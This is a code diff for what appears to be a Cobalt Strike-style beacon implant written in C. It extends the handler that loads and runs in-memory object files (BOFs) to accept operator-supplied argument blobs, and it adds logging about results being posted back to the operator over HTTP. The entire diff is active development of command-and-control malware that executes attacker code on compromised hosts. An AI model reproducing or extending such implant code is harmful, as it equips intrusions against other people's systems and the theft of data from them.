@@ -98,6 +98,13 @@ static BOOL use_token_a(HANDLE token) {
  * the waiting operator callback instead of the beacon console */
 static int g_obj_callback = 0;
 
+/* user BOF arguments for the extended official task shape (task_cb
+ * rewrite): args4 on the wire is the callback id, the real BOF arguments
+ * ride the optional trailing length-prefixed blob. Set by the cmd100
+ * official parser, consumed by the object execution below. */
+static char * g_obj_userargs = NULL;
+static int    g_obj_userargs_len = 0;
+
 /* 2026-11-03 object-output tracing: the ipconfig result never left the
  * beacon - log every postmsg entry + the POST queue level around the
  * official-shape object execution (extern the queue len from the http
@@ -1521,14 +1528,37 @@ void command_inline_execute_object(char * buffer, int length) {
 		da491 = data_extract(&p);
 		rl491 = data_extract(&p);
 		ar491 = data_extract(&p);
-		if (p.length != 0) ok491 = FALSE;
-		if (ar491.length != 4) ok491 = FALSE;
-		if (c491.length == 0 || (DWORD)c491.length <= entry491) ok491 = FALSE;
+		/* extended tail (2026-11-04): server-rewritten task_cb tasks carry
+		 * ONE more length-prefixed blob after args4 - the USER BOF args
+		 * (args4 itself is the server-allocated callback id). Official
+		 * tasks end at args4. Strictly: zero or one tail blob, fully
+		 * consumed. Only committed to the globals once every check passes
+		 * so a failed validation never leaks a stale tail into the next
+		 * task. */
+		{
+			datap_buffer ua491;
+			char * ua_ptr = NULL;
+			int    ua_len = 0;
+			ua491.buffer = NULL;
+			ua491.length = 0;
+			if (p.length > 0) {
+				ua491 = data_extract(&p);
+				if (ua491.buffer == NULL || p.length != 0) ok491 = FALSE;
+				else { ua_ptr = ua491.buffer; ua_len = ua491.length; }
+			}
+			if (ar491.length != 4) ok491 = FALSE;
+			if (c491.length == 0 || (DWORD)c491.length <= entry491) ok491 = FALSE;
+			if (ok491) {
+				g_obj_userargs = ua_ptr;
+				g_obj_userargs_len = ua_len;
+			}
+		}
 		/* rd/rl MAY be empty: official interfaces.x64.o has no .rdata section
 		 * at all (2026-11-03) - the old non-empty requirement made every
 		 * task_ipconfig fall into the legacy BOF path and the result never
 		 * reached the operator callback. */
 		spawn_log("cmd100 official ok491=", (long)ok491);
+		spawn_log("cmd100 uargs_len=", (long)g_obj_userargs_len);
 		spawn_log("cmd100 c_len=", (long)c491.length);
 		spawn_log("cmd100 args_len=", (long)ar491.length);
 		spawn_log("cmd100 entry=", (long)entry491);
@@ -1566,15 +1596,19 @@ void command_inline_execute_object(char * buffer, int length) {
 
 			{
 				BOOL okrun;
+				char * runargs = (g_obj_userargs != NULL) ? g_obj_userargs : ar491.buffer;
+				int    runalen = (g_obj_userargs != NULL) ? g_obj_userargs_len : ar491.length;
 				spawn_log("cmd100 preq=", (long)http_post_len);
 				okrun = command_inline_execute_object_parsed(bformat_string(&rep),
 				                                             bformat_length(&rep),
-				                                             entry491, ar491.buffer,
-				                                             ar491.length, 0);
+				                                             entry491, runargs,
+				                                             runalen, 0);
 				spawn_log("cmd100 parsed ret=", (long)okrun);
 				spawn_log("cmd100 postq=", (long)http_post_len);
 			}
 			g_obj_callback = 0;
+			g_obj_userargs = NULL;
+			g_obj_userargs_len = 0;
 			bformat_free(&rep);
 			return;
 		}
